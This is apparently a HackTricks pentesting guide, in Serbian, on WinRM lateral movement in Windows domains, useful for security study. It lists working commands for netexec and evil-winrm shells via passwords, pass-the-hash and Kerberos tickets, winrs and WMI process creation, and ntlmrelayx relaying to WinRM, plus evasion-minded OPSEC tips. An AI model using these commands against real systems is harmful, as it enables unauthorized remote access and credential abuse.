# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM je jedan od najpraktičnijih transporta za **lateral movement** u Windows okruženjima jer daje udaljeni shell preko **WS-Man/HTTP(S)** bez potrebe za trikovima sa kreiranjem SMB servisa. Ako meta izlaže **5985/5986** i vaš principal ima dozvolu za remoting, često možete veoma brzo preći sa "valid creds" na "interactive shell".

Za **enumeration protokola/servisa**, listenere, omogućavanje WinRM, `Invoke-Command`, i generičko korišćenje klijenta, pogledajte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Zašto operatori vole WinRM

- Koristi **HTTP/HTTPS** umesto SMB/RPC, pa često radi tamo gde je PsExec-style izvršavanje blokirano.
- Sa **Kerberos**, ne šalje reusable credentials na metu.
- Radi čisto iz **Windows**, **Linux**, i **Python** alata (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktivna PowerShell remoting putanja pokreće **`wsmprovhost.exe`** na meti pod kontekstom autentifikovanog korisnika, što je operativno drugačije od service-based exec.

## Model pristupa i preduslovi

U praksi, uspešan WinRM lateral movement zavisi od **tri** stvari:

1. Meta ima **WinRM listener** (`5985`/`5986`) i firewall pravila koja dozvoljavaju pristup.
2. Nalog može da se **autentifikuje** na endpoint.
3. Nalog sme da **otvori remoting session**.

Uobičajeni načini za dobijanje tog pristupa:

- **Local Administrator** na meti.
- Članstvo u **Remote Management Users** na novijim sistemima ili **WinRMRemoteWMIUsers__** na sistemima/komponentama koje i dalje poštuju tu grupu.
- Eksplicitna remoting prava dodeljena kroz local security descriptors / PowerShell remoting ACL izmene.

Ako već kontrolišete box sa admin pravima, zapamtite da takođe možete **delegirati WinRM access bez punog članstva u admin grupi** koristeći tehnike opisane ovde:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas koje su bitne tokom lateral movement

- **Kerberos zahteva hostname/FQDN**. Ako se povežete preko IP adrese, klijent obično pada nazad na **NTLM/Negotiate**.
- U **workgroup** ili cross-trust edge case-ovima, NTLM često zahteva ili **HTTPS** ili da meta bude dodata u **TrustedHosts** na klijentu.
- Sa **local accounts** preko Negotiate u workgroup-u, UAC remote restrictions mogu sprečiti pristup osim ako se ne koristi ugrađeni Administrator nalog ili `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting podrazumevano koristi **`HTTP/<host>` SPN**. U okruženjima gde je **`HTTP/<host>`** već registrovan na neki drugi service account, WinRM Kerberos može da padne sa `0x80090322`; koristite SPN sa portom ili pređite na **`WSMAN/<host>`** gde taj SPN postoji.

Ako dobijete valid credentials tokom password spraying-a, njihova provera preko WinRM je često najbrži način da proverite da li se mogu pretvoriti u shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec za validaciju i one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM za interaktivne shell-ove

`evil-winrm` i dalje ostaje najpraktičnija interaktivna opcija sa Linux-a jer podržava **lozinke**, **NT hash-eve**, **Kerberos karte**, **client certificates**, prenos fajlova i in-memory učitavanje PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Kada podrazumevani **`HTTP/<host>`** SPN izaziva Kerberos greške, pokušajte da zatražite/koristite **`WSMAN/<host>`** ticket umesto toga. Ovo se pojavljuje u ojačanim ili neobičnim enterprise okruženjima gde je **`HTTP/<host>`** već dodeljen drugom service account-u.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Ovo je takođe korisno nakon zloupotrebe **RBCD / S4U** kada ste posebno forged ili requested **WSMAN** service ticket umesto generičkog `HTTP` ticket-a.

### Certificate-based authentication

WinRM takođe podržava **client certificate authentication**, ali sertifikat mora biti mapiran na cilju na **local account**. Iz ofanzivne perspektive ovo je bitno kada:

- ste već ukrali/izvezli validan client certificate i private key koji je već mapiran za WinRM;
- ste zloupotrebili **AD CS / Pass-the-Certificate** da dobijete sertifikat za principal i zatim pivotujete u drugi authentication path;
- radite u okruženjima koja namerno izbegavaju password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM je mnogo ređi od password/hash/Kerberos autentikacije, ali kada postoji može da obezbedi **passwordless lateral movement** putanju koja preživljava rotaciju lozinke.

### Python / automation with `pypsrp`

Ako vam treba automatizacija umesto operator shell-a, `pypsrp` vam daje WinRM/PSRP iz Pythona sa podrškom za **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` je ugrađen i koristan kada želite **nativno WinRM izvršavanje komandi** bez otvaranja interaktivne PowerShell remoting sesije:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operativno, `winrs.exe` često rezultira lancem udaljenih procesa sličnim:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Ovo vredi zapamtiti jer se razlikuje od service-based exec i od interaktivnih PSRP sesija.

### `winrm.cmd` / WS-Man COM umesto PowerShell remoting

Takođe možete izvršavati kroz **WinRM transport** bez `Enter-PSSession` tako što pozivate WMI klase preko WS-Man. Ovo zadržava transport kao WinRM, dok primitiv za udaljeno izvršavanje postaje **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Taj pristup je koristan kada:

- PowerShell logging je snažno nadgledan.
- Želite **WinRM transport** ali ne i klasičan PS remoting workflow.
- Pravite ili koristite custom tooling oko **`WSMan.Automation`** COM objekta.

## NTLM relay ka WinRM (WS-Man)

Kada je SMB relay blokiran zbog signing-a, a LDAP relay je ograničen, **WS-Man/WinRM** i dalje može biti atraktivna relay meta. Moderni `ntlmrelayx.py` uključuje **WinRM relay servers** i može da radi relay ka **`wsman://`** ili **`winrms://`** targetima.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dve praktične napomene:

- Relay je najkorisniji kada cilj prihvata **NTLM** i relayed principal sme da koristi WinRM.
- Najnoviji Impacket code posebno obrađuje **`WSMANIDENTIFY: unauthenticated`** zahteve, tako da `Test-WSMan`-style probes ne kvare relay flow.

Za multi-hop ograničenja nakon što dobiješ prvu WinRM sesiju, pogledaj:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC i napomene o detekciji

- **Interactive PowerShell remoting** obično kreira **`wsmprovhost.exe`** na cilju.
- **`winrs.exe`** obično kreira **`winrshost.exe`** i zatim traženi child process.
- Očekuj **network logon** telemetry, WinRM service events, i PowerShell operational/script-block logging ako koristiš PSRP umesto čistog `cmd.exe`.
- Ako ti treba samo jedna komanda, `winrs.exe` ili one-shot WinRM execution mogu biti tiši od dugotrajne interactive remoting session.
- Ako je Kerberos dostupan, preferiraj **FQDN + Kerberos** umesto IP + NTLM da smanjiš i trust issues i nezgodne client-side `TrustedHosts` izmene.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
